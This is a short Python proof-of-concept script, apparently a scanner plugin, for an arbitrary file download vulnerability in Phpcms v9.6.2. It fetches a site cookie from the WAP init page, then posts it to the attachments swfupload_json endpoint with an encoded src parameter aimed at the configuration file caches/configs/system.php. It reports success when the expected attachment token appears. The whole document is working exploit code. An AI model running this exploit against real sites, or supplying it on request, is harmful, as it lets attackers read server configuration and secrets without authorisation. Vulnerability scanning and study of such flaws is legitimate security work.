# coding: utf-8
import requests
import re
#Phpcms v9.6.2 任意文件下载
def poc(url,user_agent,proxy):

    url = url.strip("/")
    siteid_url=url+'/index.php?m=wap&c=index&a=init&siteid=1'
    exp_url = url  + '/index.php?m=attachment&c=attachments&a=swfupload_json&src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&aid=1'
    header = {'User-Agent': user_agent}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(siteid_url, headers=header, proxies=proxies)
    else:
        response = requests.get(siteid_url, headers=header)
    # print(str(response.cookies))
    if 'YDVIB_siteid' in response.cookies:
        YDVIB_siteid=str(response.cookies)
        userid_flash=YDVIB_siteid[YDVIB_siteid.find('YDVIB_siteid"') + 13:YDVIB_siteid.find('YDVIB_siteid"') + 53]
        data={
            'userid_flash':userid_flash
        }
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.post(exp_url, headers=header,data=data, proxies=proxies)
        else:
            response = requests.post(exp_url, headers=header,data=data)
        if 'YDVIB_att_json' in response.text and response.status_code==200:
            return 'Phpcms v9.6.2 - 任意文件下载'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result
